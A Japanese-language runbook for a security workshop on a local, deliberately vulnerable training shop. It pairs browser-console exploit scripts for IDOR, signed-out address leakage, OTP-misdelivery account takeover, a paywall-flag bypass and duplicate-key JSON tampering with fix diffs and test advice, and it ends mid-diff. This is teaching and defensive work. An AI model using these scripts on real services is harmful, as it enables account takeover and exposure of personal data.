# セキュリティデモ実演手順書

更新日: 2026-11-11

新規4件を本編、既存3件を比較用として実演するための手順書。ブラウザ操作と開発者ツールのConsoleを使用する。LLM・メールサーバー・外部の決済サービスは不要。

参加者が各自のPCで起動する場合は、[参加者向けセットアップ](participant-quickstart.md)から始める。

公開事例の出典は [追加候補の調査メモ](ai-discovered-web-vulnerability-candidates.md)、実装とテストの詳細は [新規4件の再現手順](ai-discovered-web-vulnerability-demos.md) を参照。

各デモは「正常な操作 → 条件を1つ変える → 結果を確認する → 復旧」の順に進める。章末の **脆弱性の詳細** を開くと、原因となる実装、修正案のdiff、発見・再発防止に使うテストを確認できる。

コードはこのリポジトリの実装からの抜粋。diffは原因を解消するための講演用修正案で、アプリには適用していない。教材のチャレンジ達成判定やテストは脆弱な挙動を前提としているため、修正を実装する場合はそれらも整合させる。これらの差分だけでアプリ全体の安全性を保証するものではない。

## 1. 実演順と説明の軸

| 順番 | 演習 | 区分 | 見せる結果 | 目安 |
| --- | --- | --- | --- | --- |
| 1 | View Basket | 既存・比較用 | ログインユーザーはBのまま、Aのカートが見える | 2分 |
| 2 | Signed Out Address Preview | 新規・候補3 | Bでは拒否され、ログアウトするとAの住所が見える | 2分 |
| 3 | Borrowed Delivery Address | 新規・候補4 | Bの注文確認にAの住所が表示される | 3分 |
| 4 | Misdelivered Login Code | 新規・候補1 | Bの受信箱に届いたコードでAにログインできる | 3分 |
| 5 | Recipe Paywall Bypass | 新規・候補2 | 一般会員のままDeluxeレシピを取得できる | 2分 |
| 6 | Manipulate Basket | 既存・比較用 | 単純な改変は拒否され、重複キーを使うとAのカートに商品が入る | 3分 |
| 7 | Deluxe Fraud | 既存・比較用 | 支払い方法を省略すると未払いでDeluxe会員になる | 2分 |

本編だけなら表の順番2〜5（本書の第5〜8章）を実施する。**Deluxe Fraudは最後に行う。** Bを先にDeluxe会員にすると、Recipe Paywall Bypassの「一般会員では見えない」という比較が成立しない。

導入で伝える内容:

> AIが画面・配信されたコード・APIの関係を調べ、認可の抜け道を仮説検証した公開事例を教材化しました。今日はその探索の発想を、短いブラウザ操作で再現します。

この実演自体はAIによる発見のライブ実行ではない。既存演習3件について、最近AIが初めて発見した脆弱性とは説明しない。

## 2. 起動・ブラウザの準備

### 2.1 起動URL

標準URL: <http://localhost:3000>

通常の開発環境では、リポジトリのルートで次を実行する。

```sh
npm install
npm start
```

ソース変更後の再ビルドが必要な場合は、起動前に `npm run build` を実行する。NixOS上で依存関係の構築が必要な場合は、次の構築済みDocker環境を利用できる。

### 2.2 この作業で用意したDocker環境

コンテナ名: `juice-shop-development-20261111`

作業ディレクトリ: `/juice-shop`

公開先: `127.0.0.1:3000`

まず起動状態を確認する。

```sh
docker ps -a --filter name=juice-shop-development-20261111
curl http://localhost:3000/rest/admin/application-version
```

HTTP応答が返れば、そのまま使える。コンテナ自体が停止している場合は `docker start juice-shop-development-20261111` で起動する。このコンテナの起動コマンドは待機用なので、コンテナが動いていてもアプリが未起動なら次を実行する。

```sh
docker exec -d -w /juice-shop juice-shop-development-20261111 sh -c 'npm start > /tmp/juice-shop-demo-app.log 2>&1'
docker exec juice-shop-development-20261111 tail -30 /tmp/juice-shop-demo-app.log
```

既にHTTP応答が返る場合は、アプリの起動コマンドを重ねて実行しない。

### 2.3 ウィンドウを分離する

- 通常ウィンドウを **A用**、プライベート／シークレットウィンドウを **B用**にする。
- 両方で `http://localhost:3000` を開き、WelcomeとCookieの表示を閉じる。
- 表示言語を英語にすると、下記のボタン名と一致する。
- URLは `localhost` に統一する。`127.0.0.1` と混在させると、Cookieや保存領域が別になる。
- 同じ通常ウィンドウの別タブだけではアカウントが分離されない。`localStorage` とCookieを共有するため、A/Bには異なるブラウザプロファイルを使う。

ConsoleはChrome/Edgeなら `Ctrl+Shift+J`、Firefoxなら開発者ツールのConsoleから開く。以降のスクリプトは、それぞれ括弧で囲んだ独立したブロックになっており、同じConsoleで再実行できる。

## 3. アカウント・配送先・カートの事前準備

### 3.1 アカウント

このセッションで用意したアカウントは次のとおり。サーバーを再起動した場合は作り直す。

| 用途 | メールアドレス | パスワード |
| --- | --- | --- |
| A: 対象ユーザー | `demo-owner@juice-sh.op` | `Demo-2026-Local!` |
| B: 操作するユーザー | `demo-user@juice-sh.op` | `Demo-2026-Local!` |

`/#/login` からログインする。まだ存在しない場合は **Not yet a customer?** から登録する。再入力用パスワードも同じ値にし、秘密の質問と回答はデモ用の値を設定する。両アカウントは一般顧客のまま使い、TOTPは設定しない。

### 3.2 配送先

Aで `/#/address/saved` を開き、住所が未登録なら **Add New Address** から登録する。

| 項目 | A | B |
| --- | --- | --- |
| Full name | `Demo Customer A` | `Demo Customer B` |
| Mobile number | `1234567890` | `1234567890` |
| ZIP code | `12345` | `12345` |
| Address | `42 Training Street` | `7 Practice Lane` |
| City | `Demo City` | `Demo City` |
| State | `Demo State` | `Demo State` |
| Country | `Japan` | `Japan` |

Bにも同様に住所を登録する。Aの保存済み住所の目のアイコンを押し、プレビューURLの数値IDを控える。例: `/#/address/preview/7` なら住所IDは `7`。**IDは再起動後や準備の順番によって変わる。**

### 3.3 カート

1. Aで商品を1つカートに入れる。
2. AのConsoleで `sessionStorage.getItem('bid')` を実行し、AのカートIDを控える。
3. Bでも別の商品を1つカートに入れる。
4. A/Bのカートをそれぞれ開き、商品名の違いを確認する。両方が空だと、カートの入れ替わりが画面で伝わらない。

### 3.4 Bの実演用メモを保存する

Bでログインした状態で、次をConsoleに貼り付ける。2つの入力ダイアログに、Aの住所IDとAのカートIDを入力する。

```js
(() => {
  const ownerAddressId = Number(prompt('Aの住所プレビューURLに含まれる数値ID'))
  const ownerBasketId = Number(prompt('AのsessionStorageにあるbidの数値'))
  const userBasketId = Number(sessionStorage.getItem('bid'))
  if (![ownerAddressId, ownerBasketId, userBasketId].every(id => Number.isInteger(id) && id > 0)) {
    throw new Error('住所ID・カートIDを確認してください。')
  }
  const config = {
    ownerEmail: 'demo-owner@juice-sh.op',
    userEmail: 'demo-user@juice-sh.op',
    ownerAddressId, ownerBasketId, userBasketId
  }
  sessionStorage.setItem('securityDemoConfig', JSON.stringify(config))
  console.table(config)
})()
```

このメモにはパスワードやトークンを保存しない。Bのウィンドウを閉じると失われる。アカウント名を変えた場合は、スクリプト内のメールアドレスも変える。

### 3.5 解答状況

`/#/score-board` を開き、実演するチャレンジの解答状況を確認する。スコアはサーバー全体で共有され、A/Bごとの独立スコアではない。解答済みでも動作の再現はできるが、初回の解答通知は再表示されない。

## 4. View Basket（他人のカートを覗けてしまう脆弱性）

**開始状態:** Bでログインし、自分の `/#/basket` を表示している。

1. AccountメニューにBのメールアドレスが表示されることを示す。
2. Bのカートの商品を示す。
3. BのConsoleで次を実行する。

```js
(() => {
  const config = JSON.parse(sessionStorage.getItem('securityDemoConfig'))
  sessionStorage.setItem('bid', String(config.ownerBasketId))
  location.hash = '/basket'
  location.reload()
})()
```

4. AccountメニューはBのまま、カートの商品だけがAのものになる。
5. スコアボードで **View Basket** が解けたことを確認する。

**次に進む前の復旧:** BのConsoleで次を実行し、自分のカートに戻す。

```js
(() => {
  const config = JSON.parse(sessionStorage.getItem('securityDemoConfig'))
  sessionStorage.setItem('bid', String(config.userBasketId))
  location.hash = '/basket'
  location.reload()
})()
```

<details>
<summary>脆弱性の詳細</summary>

### 原因：ログインの確認だけでは、カートの所有者を確認できない

対象API: `GET /rest/basket/:id`。分類はIDOR／BOLA（オブジェクト単位の認可不備）。ブラウザの `bid` は参照先を指定する値であり、アクセス権の証明にはならない。

[routes/basket.ts の retrieveBasket()](../routes/basket.ts) は、要求されたIDだけでカートを取得している。

```ts
const id = req.params.id
const basket = await BasketModel.findOne({ where: { id }, include: [{ model: ProductModel, paranoid: false, as: 'Products' }] })
```

後続の `challengeUtils.solveIf(...)` は演習の達成判定で、アクセスを拒否する処理ではない。Bのセッションを維持したままIDをAのものに変えると、Aのカートが応答に含まれる。

### 修正案：認証済みユーザーの所有物に検索範囲を限定する

```diff
--- a/routes/basket.ts
+++ b/routes/basket.ts
@@ -45,7 +45,16 @@ export function retrieveBasket () {
   return async (req: Request, res: Response, next: NextFunction) => {
     try {
       const id = req.params.id
-      const basket = await BasketModel.findOne({ where: { id }, include: [{ model: ProductModel, paranoid: false, as: 'Products' }] })
+      const user = security.authenticatedUsers.from(req)
+      if (!user) {
+        res.status(401).json({ error: 'Please log in to view your basket.' })
+        return
+      }
+      const basket = await BasketModel.findOne({ where: { id, UserId: user.data.id }, include: [{ model: ProductModel, paranoid: false, as: 'Products' }] })
+      if (!basket) {
+        res.status(404).json({ error: 'Basket not found.' })
+        return
+      }
       /* jshint eqeqeq:false */
       challengeUtils.solveIf(challenges.basketAccessChallenge, () => {
         const user = security.authenticatedUsers.from(req)
```

ユーザーIDはサーバーで解決したセッションから取る。他人のIDと存在しないIDは、どちらも404にして内容を返さない。

### どうテストすれば気付けるか

- **最初に行うAPIテスト:** AのカートIDを固定し、Aのトークンなら200、Bなら404、認証情報なしなら401になることを確認する。Bへの応答にAの商品名やカート情報が含まれないことも確認する。
- **DAST／ZAP:** A/Bで取得した要求を別ユーザーのトークンに差し替えて再送する。IDの列挙だけでは、そのカートを誰が所有するか分からないため、A/Bの既知データを使う。
- **静的解析:** `req.params.id` からDB検索、応答への流れを追い、所有者条件が欠けている箇所をレビュー対象にする。SQLインジェクション検査が通っても、この認可不備は残る。
- **プロパティテスト／形式化する条件:** 「カートを返したなら `basket.UserId === session.userId`」。異なる所有者の組合せを生成して検査する。

既存の [APIテスト](../test/api/basket.test.ts) には、他人のカートが200で取得できることを確認するケースがある。これは教材の成立を確認するテストであり、上記の安全性を確認するテストとは期待値が逆になる。

参考: [OWASP IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)、[WSTG: IDORのテスト](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)。

</details>

## 5. Signed Out Address Preview（ログアウトすると他人の住所が見えてしまう脆弱性）

**開始状態:** Bでログインしている。Aの住所を登録済み。

1. BのConsoleでAのプレビューを開く。

```js
(() => {
  const config = JSON.parse(sessionStorage.getItem('securityDemoConfig'))
  location.hash = `/address/preview/${config.ownerAddressId}`
})()
```

2. `This address belongs to another customer.` と表示され、住所が見えないことを示す。
3. Account → **Logout** を押す。
4. 同じConsoleのスクリプトをもう一度実行する。`securityDemoConfig` はログアウトしても残る。
5. `Demo Customer A`、`42 Training Street`、電話番号が表示される。
6. **Signed Out Address Preview** が解ける。

**復旧:** Bとして `/#/login` からログインし直す。プレビュー画面はそのままにせず、次の注文確認へ進む。

<details>
<summary>脆弱性の詳細</summary>

### 原因：認証情報がない要求だけ、拒否条件を通り抜ける

対象API: `GET /rest/address/:id/preview`。[routes/address.ts の previewAddress()](../routes/address.ts) の次の部分が原因になる。

```ts
const user = security.authenticatedUsers.from(req)
if (req.headers.authorization && !user) {
  res.status(401).json({ error: 'Invalid session.' })
  return
}
const address = await AddressModel.findByPk(req.params.id)
if (!address) {
  res.status(404).json({ error: 'Address not found.' })
  return
}
if (user && address.UserId !== user.data.id) {
  res.status(403).json({ error: 'This address belongs to another customer.' })
  return
}
```

不正なAuthorizationヘッダーは401、Bの有効なセッションは403。しかし、ヘッダーを取り除くと最初の条件も所有者チェックも成立せず、後続の処理が住所を返してしまう。分類は認証・認可の欠落。

### 修正案：ユーザーを特定できない要求を先に拒否する

```diff
--- a/routes/address.ts
+++ b/routes/address.ts
@@ -12,7 +12,7 @@ import * as challengeUtils from '../lib/challengeUtils'
 export function previewAddress () {
   return async (req: Request, res: Response) => {
     const user = security.authenticatedUsers.from(req)
-    if (req.headers.authorization && !user) {
+    if (!user) {
       res.status(401).json({ error: 'Invalid session.' })
       return
     }
@@ -21,7 +21,7 @@ export function previewAddress () {
       res.status(404).json({ error: 'Address not found.' })
       return
     }
-    if (user && address.UserId !== user.data.id) {
+    if (address.UserId !== user.data.id) {
       res.status(403).json({ error: 'This address belongs to another customer.' })
       return
     }
```

ログインを必須にしたうえで、住所の所有者も確認する。「ログインしていれば所有者を確認する」という条件付きの保護をなくす。

### どうテストすれば気付けるか

- **最初に行うAPIテスト:** 同じAの住所に対して、A＝200、B＝403、認証情報なし＝401、不正なトークン＝401を確認する。拒否応答に住所・電話番号が含まれないことも検査する。
- **DAST／ZAP:** 正常な要求からAuthorizationヘッダーを削除して再送する。認証情報をCookieでも送る環境では、そちらも外して未認証にする。「不正なトークン」と「トークンなし」は別ケースにする。
- **静的解析:** `user && ...` のような拒否条件を見つけ、`user` が存在しない経路から応答に到達できるかを調べる。
- **プロパティテスト／形式化する条件:** 「住所を返したなら、セッションが存在し、住所の所有者がそのユーザーである」。認証状態を変数に含めれば、未認証の反例を探せる。

既存の [APIテスト](../test/api/address-boundaries.test.ts) と [E2E](../test/cypress/e2e/addressBoundaries.spec.ts) は、ログアウト後の情報漏えいを再現する。修正後の回帰テストでは、その要求が拒否されることを期待する。

参考: [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)。

</details>

## 6. Borrowed Delivery Address（自分の注文に他人の住所を指定できてしまう脆弱性）

**開始状態:** Bとしてログインし、自分のカートを参照している。

### 6.1 正常な注文確認まで進む

1. Bで **Your Basket** → **Checkout** を押す。
2. B自身の住所 `Demo Customer B` を選んで **Continue**。
3. 配送方法を選んで **Continue**。
4. 支払い方法画面で、保存済みのカードを選ぶ。まだなければ **Add new card** でデモ用カードを登録する。

| 項目 | 入力値 |
| --- | --- |
| Name | `Demo Customer B` |
| Card number | `4111111111111111` |
| Expiry month | `12` |
| Expiry year | 選択肢にある将来の年（現在の実装では `2080` など） |

このアプリ内で使う架空のカード情報。保存後にカードのラジオボタンを選び、**Continue** で注文確認へ進む。ウォレット残高が不足している場合はウォレット払いを選ばない。

5. 注文確認で、配送先が `Demo Customer B` であることを示す。

### 6.2 参照先だけを変更する

6. BのConsoleで次を実行する。

```js
(() => {
  const config = JSON.parse(sessionStorage.getItem('securityDemoConfig'))
  sessionStorage.setItem('demoOriginalAddressId', sessionStorage.getItem('addressId'))
  sessionStorage.setItem('addressId', String(config.ownerAddressId))
  location.reload()
})()
```

7. Bのカートと支払い方法は同じまま、配送先がAになる。
8. **Borrowed Delivery Address** が解ける。**Place your order and payは押さない。** 住所の表示までで成立する。

**復旧:** 次のConsole操作でB自身の住所に戻す。その後は注文を確定せず別のページへ移動する。

```js
(() => {
  const addressId = sessionStorage.getItem('demoOriginalAddressId')
  if (!addressId || addressId === 'null') throw new Error('B自身の住所を選び直してください。')
  sessionStorage.setItem('addressId', addressId)
  location.reload()
})()
```

<details>
<summary>脆弱性の詳細</summary>

### 原因：カートの認可はあるが、関連付ける住所の認可がない

対象API: `POST /rest/basket/:id/address`。[routes/basket.ts の setDeliveryAddress()](../routes/basket.ts) は先に `id` と `UserId` でカートの所有者を確認しているが、住所の取得はIDだけで行っている。

```ts
const address = await AddressModel.findByPk(addressId)
if (!address) {
  res.status(404).json({ error: 'Address not found.' })
  return
}
await basket.update({ addressId: address.id })
challengeUtils.solveIf(challenges.checkoutAddressChallenge, () => address.UserId !== user.data.id)
res.json({ status: 'success', data: address })
```

分類は関連オブジェクトへのIDOR／BOLA。住所IDの形式や存在を確認しても、その住所をBが利用してよいかは確認できない。通常の住所取得APIが保護されていても、この関連付けAPIから住所全体が返ってくる。

### 修正案：関連付ける住所も、同じユーザーの所有物に限定する

```diff
--- a/routes/basket.ts
+++ b/routes/basket.ts
@@ -30,7 +30,7 @@ export function setDeliveryAddress () {
       res.status(400).json({ error: 'A valid delivery address is required.' })
       return
     }
-    const address = await AddressModel.findByPk(addressId)
+    const address = await AddressModel.findOne({ where: { id: addressId, UserId: user.data.id } })
     if (!address) {
       res.status(404).json({ error: 'Address not found.' })
       return
```

所有者条件を満たす住所が見つかるまで、カートの更新も住所の返却も行わない。`sessionStorage.addressId` の値はサーバーへの入力にすぎず、ブラウザで選択済みであることを信用しない。

### どうテストすれば気付けるか

- **最初に行うAPIテスト:** BのトークンとBのカートを固定し、Bの住所なら200、Aの住所なら404を期待する。拒否時は住所が漏れず、DB上の `basket.addressId` も元の値から変化しないことを確認する。
- **組合せテスト:** 操作者A/B × カートA/B × 住所A/Bを試す。この教材の仕様では、操作者・カート所有者・住所所有者が一致する組合せだけを許可する。
- **DAST／fuzzing:** カートIDだけでなく、本文の `addressId` を他ユーザーの既知IDに差し替える。数値の範囲だけを変えるfuzzingでは、住所が実在して他人のものだという条件を作れない場合がある。
- **静的解析／形式化する条件:** 更新前に「`basket.UserId === session.userId && address.UserId === session.userId`」が成立するかを追う。外部キー制約は住所の存在を保証しても、所有者の一致までは保証しない。

再現例は [APIテスト](../test/api/address-boundaries.test.ts) と [E2E](../test/cypress/e2e/addressBoundaries.spec.ts)。住所の直接取得と、カートへの住所設定は別々に検査する。

参考: [OWASP IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)。

</details>

## 7. Misdelivered Login Code（他人のログインコードを自分宛てに送れてしまう脆弱性）

**開始状態:** Bでログインしている。A/Bは一般顧客で、TOTPは未設定。

### 7.1 正常な送信先を確認する

1. Bで `/#/email-login` を開き、Bのメールアドレスで **Send sign-in code** を押す。
2. 別タブでBの `/#/mailbox` を開き、**Refresh inbox** を押すとコードが見える。
3. そのタブを閉じ、実演はBの元のウィンドウで続ける。

### 7.2 AのコードをBに送る

4. Bで `/#/mailbox` を開く。
5. Consoleで次を実行する。

```js
(async () => {
  const config = JSON.parse(sessionStorage.getItem('securityDemoConfig'))
  const response = await fetch('/rest/user/email-login/request', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: config.ownerEmail,
      sendTo: config.userEmail,
      codeChannel: 'EMAIL'
    })
  })
  const body = await response.json()
  if (!response.ok) throw new Error(body.error)
  sessionStorage.setItem('demoOtpRequestId', body.data.requestId)
  console.log('AのログインコードをBのメールボックスに送信しました。')
})()
```

6. **Refresh inbox** を押す。送信先表示はBのまま、コードが届く。
7. 直前の正常送信コードも残っている場合は、**後から表示されたコード**を選ぶ。新しい要求は一覧の末尾に追加される。

### 7.3 正規のコードでAにログインする

8. 次のスクリプトを実行し、入力ダイアログに後から届いた6桁を入力する。

```js
(async () => {
  const code = prompt('Aへのログイン要求でBに届いた6桁のコード')
  const response = await fetch('/rest/user/email-login/verify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ requestId: sessionStorage.getItem('demoOtpRequestId'), code })
  })
  const body = await response.json()
  if (!response.ok || !body.authentication) throw new Error(body.error || 'コードを確認してください。')
  const authentication = body.authentication
  localStorage.setItem('token', authentication.token)
  document.cookie = `token=${authentication.token}; path=/`
  sessionStorage.setItem('bid', String(authentication.bid))
  location.reload()
})()
```

9. メールボックスの所有者表示がAになる。AccountメニューもAになり、**Misdelivered Login Code** が解ける。

**復旧:** B用ウィンドウで一度ログアウトし、Bとして再ログインする。次のレシピデモをAのままで進めない。`securityDemoConfig` はそのまま使える。

コードは5分で失効する。同じAのコードを再発行すると古い要求は無効になる。5回誤入力した場合も、送信からやり直す。OTPを送信しただけではチャレンジは解けない。

<details>
<summary>脆弱性の詳細</summary>

### 原因：ログインするアカウントと、本人確認コードの送信先を別々に信用する

対象API: `POST /rest/user/email-login/request` と `POST /rest/user/email-login/verify`。[routes/emailLogin.ts](../routes/emailLogin.ts) の発行処理では、両方が存在するアカウントであれば、その組合せを受け入れる。

```ts
const user = await UserModel.findOne({ where: { email } })
const recipient = await UserModel.findOne({ where: { email: sendTo } })
if (!user || !recipient || user.totpSecret || ![security.roles.customer, security.roles.deluxe].includes(user.role)) {
  res.status(400).json({ error: 'Email sign-in is not available for this account or recipient.' })
  return
}
```

保存する要求には、別々に選ばれたユーザーIDと送信先が入る。

```ts
codes.set(requestId, {
  userId: user.id,
  recipient: sendTo,
  code: String(randomInt(100000, 1000000)),
  expiresAt: Date.now() + 5 * 60 * 1000,
  attempts: 0
})
```

検証時は、その要求の `pending.userId` でログイントークンを発行する。つまりBの受信箱を読めることが、Aとしてログインする根拠になってしまう。分類は認証フローの不備によるアカウント乗っ取り。コードの乱数・期限・試行回数を強化しても、配送先の結び付けが間違ったままでは防げない。

### 修正案：コードの送信先を、対象アカウントの登録情報から決める

```diff
--- a/routes/emailLogin.ts
+++ b/routes/emailLogin.ts
@@ -38,8 +38,7 @@ export function emailLogin () {
         return
       }
       const user = await UserModel.findOne({ where: { email } })
-      const recipient = await UserModel.findOne({ where: { email: sendTo } })
-      if (!user || !recipient || user.totpSecret || ![security.roles.customer, security.roles.deluxe].includes(user.role)) {
+      if (!user || user.totpSecret || ![security.roles.customer, security.roles.deluxe].includes(user.role)) {
         res.status(400).json({ error: 'Email sign-in is not available for this account or recipient.' })
         return
       }
@@ -50,7 +49,7 @@ export function emailLogin () {
       // Mail is delivered only to the shop's simulated mailboxes.
       codes.set(requestId, {
         userId: user.id,
-        recipient: sendTo,
+        recipient: user.email,
         code: String(randomInt(100000, 1000000)),
         expiresAt: Date.now() + 5 * 60 * 1000,
         attempts: 0
```

この差分では既存クライアントとの互換性のため `sendTo` の入力形式チェックは残すが、配送先の決定には使わない。APIを整理する場合はクライアントとともにこの入力項目を廃止する。外部メールサーバーには送らず、教材内の模擬受信箱に保存する仕組みは同じ。

### どうテストすれば気付けるか

- **最初に行うフローテスト:** `email=A, sendTo=B` で要求し、Bの受信箱にその要求IDのコードが存在しないこと、Aの受信箱にだけ存在することを確認する。A宛ての正しいコードでAにログインできる正常系も残す。
- **状態を持つfuzzing:** アカウントと送信先の組合せを変え、「発行 → 受信箱の確認 → コード検証」まで通す。単一要求のステータス比較だけでは、最終的に誰としてログインできるかを見落とす。
- **静的解析:** `req.body.sendTo` が本人確認コードの配送先に流れる経路を確認し、登録済みの本人の連絡先に制約されているかレビューする。メールアドレスの形式が正しくても不十分。
- **プロパティテスト／形式化する条件:** 「コードの配送先は、ログイン対象アカウントの登録メールアドレスと一致する」。さらに期限切れ、再利用、5回の誤入力後、再発行後の旧コードも拒否されることを確認する。

既存の [APIテスト](../test/api/email-login.test.ts) と [E2E](../test/cypress/e2e/emailLogin.spec.ts) は、転送されたコードでAになれることを確認する。修正後は配送先とログイン先の結び付けを検査する期待値に変える。

参考: [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)（本人確認用コードをユーザーに結び付ける考え方を、このログインフローにも適用）。

</details>

## 8. Recipe Paywall Bypass（フラグを足すだけで有料レシピが読めてしまう脆弱性）

**開始状態:** Bでログインし、まだDeluxe会員になっていない。

1. `/#/recipes` を開く。
2. 無料の **Apple Cooler** は読めるが、**Carrot & Apple Blend** の材料と手順は会員限定であることを示す。
3. 開発者ツールのSourcesで `includeInstructions` を検索し、通常の検索画面では送られていないオプションがあることを示す。
4. Consoleで、通常の検索とフラグ付き検索を比較する。

```js
(async () => {
  const headers = {
    'Content-Type': 'application/json',
    Authorization: `Bearer ${localStorage.getItem('token')}`
  }
  for (const params of [
    { query: 'Carrot' },
    { query: 'Carrot', includeInstructions: true }
  ]) {
    const response = await fetch('/rest/recipes/search', {
      method: 'POST', headers, body: JSON.stringify(params)
    })
    const body = await response.json()
    if (!response.ok) throw new Error(body.error)
    console.log(params)
    console.table(body.data)
  }
})()
```

5. 通常要求では `ingredients` と `instructions` が `null`。フラグ付きでは全文が返る。
6. **Recipe Paywall Bypass** が解ける。
7. ページを再読み込みすると、通常画面では引き続き会員限定表示になる。一般会員のままで、会員資格そのものが変化したわけではない。

このConsole手順では、取得した全文はConsoleとNetworkの応答に表示される。通常画面を書き換える操作ではない。画面上に全文を出したい場合は、検索要求を書き換えるプロキシで `includeInstructions: true` を追加する。Cypress E2Eではこの経路で実際の表示を検証している。

**復旧:** 不要。Bは一般会員のまま。

<details>
<summary>脆弱性の詳細</summary>

### 原因：クライアント指定の表示オプションが、会員権限を上書きする

対象API: `POST /rest/recipes/search`。[routes/recipes.ts の searchRecipes()](../routes/recipes.ts) には、次の判定がある。

```ts
const unlocked = !recipe.deluxe || deluxe || includeInstructions
```

`deluxe` はサーバー側セッションの会員種別から決まるが、`includeInstructions` は要求本文から来る。OR条件なので、一般会員も `true` を送るだけで有料レシピを取得できる。分類はサーバー側の認可不備。フロントエンドの [recipe.service.ts](../frontend/src/app/Services/recipe.service.ts) がこの任意引数を持つことは探索の手掛かりになるが、コードを隠すことでは解決しない。

### 修正案：有料コンテンツの開示は会員権限だけで判断する

```diff
--- a/routes/recipes.ts
+++ b/routes/recipes.ts
@@ -5,9 +5,7 @@

 import { type Request, type Response } from 'express'
 import recipes from '../data/static/recipes.json'
-import { challenges } from '../data/datacache'
 import * as security from '../lib/insecurity'
-import * as challengeUtils from '../lib/challengeUtils'

 export function searchRecipes () {
   return (req: Request, res: Response) => {
@@ -23,8 +21,7 @@ export function searchRecipes () {
     }
     const deluxe = session.data.role === security.roles.deluxe
     const data = recipes.filter(recipe => recipe.name.toLowerCase().includes(query.toLowerCase())).map(recipe => {
-      const unlocked = !recipe.deluxe || deluxe || includeInstructions
-      challengeUtils.solveIf(challenges.recipePaywallChallenge, () => recipe.deluxe && !deluxe && includeInstructions)
+      const unlocked = !recipe.deluxe || deluxe
       return {
         id: recipe.id,
         name: recipe.name,
```

この差分では、通常画面で無料レシピを読める挙動を維持する。入力項目が残っていても、認可を拡張する効果は持たせない。

### どうテストすれば気付けるか

- **最初に行うAPIテスト:** 一般会員／Deluxe会員 × 無料／有料レシピ × フラグ省略／false／trueを比較する。一般会員への有料レシピの `ingredients` と `instructions` は、どのフラグでも `null` であることを期待する。
- **DAST／fuzzing:** 配信コードやAPI定義から見つけた任意項目を追加・反転する。ここでは有効なbooleanの `true` が攻撃入力になるため、型違反だけを生成する検査では気付けない。
- **静的解析:** 信頼できない入力が `unlocked` のような認可判定に流れ込む箇所を追う。通常のXSS／SQLインジェクション検出ルールだけでは、この会員仕様を判定できるとは限らない。
- **プロパティテスト／形式化する条件:** 「有料レシピの本文を返したなら、利用者はDeluxe会員である」。一般会員の要求オプションを変えても本文を開示しないことを検査する。

再現例は [APIテスト](../test/api/recipes.test.ts) と [E2E](../test/cypress/e2e/recipes.spec.ts)。画面の鍵アイコンだけでなく、API応答に本文が含まれないことを判定する。

参考: [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)、[WSTG: 要求の偽造](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/02-Ability_to_Forge_Requests/)。

</details>

## 9. Manipulate Basket（JSONの重複キーで他人のカートを書き換えられてしまう脆弱性）

**開始状態:** Bでログインし、カートIDはB自身のものに戻っている。Aのカートにまだ商品がある。

1. A用ウィンドウで `/#/basket` を表示しておく。
2. BのConsoleで次を実行する。Aのカートにまだ入っていない商品を1つ選び、単純な変更と重複キー付きの要求を比較する。

```js
(async () => {
  const config = JSON.parse(sessionStorage.getItem('securityDemoConfig'))
  const headers = {
    'Content-Type': 'application/json',
    Authorization: `Bearer ${localStorage.getItem('token')}`
  }
  const target = await fetch(`/rest/basket/${config.ownerBasketId}`, { headers }).then(r => r.json())
  const catalog = await fetch('/rest/products/search?q=').then(r => r.json())
  const product = catalog.data.find(p => !target.data.Products.some(item => item.id === p.id))
  if (!product) throw new Error('Aのカートにない商品を用意してください。')
  const normal = await fetch('/api/BasketItems/', {
    method: 'POST', headers,
    body: JSON.stringify({ ProductId: product.id, BasketId: String(config.ownerBasketId), quantity: 1 })
  })
  console.log('単純な変更:', normal.status, await normal.text())
  const duplicate = await fetch('/api/BasketItems/', {
    method: 'POST', headers,
    body: `{"ProductId":${product.id},"BasketId":"${config.userBasketId}","quantity":1,"BasketId":"${config.ownerBasketId}"}`
  })
  console.log('重複キー:', duplicate.status, await duplicate.text(), '追加した商品:', product.name)
})()
```

3. 最初の要求はHTTP 401の `Invalid BasketId`。重複キー付きの要求はHTTP 200になり、Aのカートへの追加が返る。
4. A用ウィンドウで再読み込みし、本当に商品が追加されたことを示す。
5. **Manipulate Basket** が解ける。

JSONのオブジェクトに重複キーを書いてから `JSON.stringify` すると、送信前に1つへ整理されてしまう。このデモでは、重複を残すため要求本文を文字列で作っている。

在庫や購入制限のエラーが返った場合は、Aのカートにない別の在庫商品を選んで同じ比較を行う。解答通知だけでなく、Aの実際のカートへの追加まで確認する。

**復旧:** Aの画面から追加した商品を削除する。Bのログイン状態は変化しない。

<details>
<summary>脆弱性の詳細</summary>

### 原因：認可に使うIDと、保存に使うIDが違う

対象API: `POST /api/BasketItems/`。[routes/basketItems.ts の addBasketItem()](../routes/basketItems.ts) は、生のJSONを独自に解析して重複したキーも配列に残す。次の認可は先頭の `BasketId`、保存は末尾の `BasketId` を使う。

```ts
const user = security.authenticatedUsers.from(req)
if (user && basketIds[0] && basketIds[0] !== 'undefined' && Number(user.bid) != Number(basketIds[0])) { // eslint-disable-line eqeqeq
  res.status(401).send('{\'error\' : \'Invalid BasketId\'}')
} else {
  const basketItem = {
    ProductId: productIds[productIds.length - 1],
    BasketId: basketIds[basketIds.length - 1],
    quantity: quantities[quantities.length - 1]
  }
```

分類はJSONの重複キーによる解釈の不一致と認可回避。前段のJSON解析や在庫チェックと、この独自パーサーでも解釈が分かれる可能性がある。認可を通った値と、更新される値を一致させる必要がある。

### 修正案：重複・欠落を拒否し、確認したカートIDを保存にも使う

```diff
--- a/routes/basketItems.ts
+++ b/routes/basketItems.ts
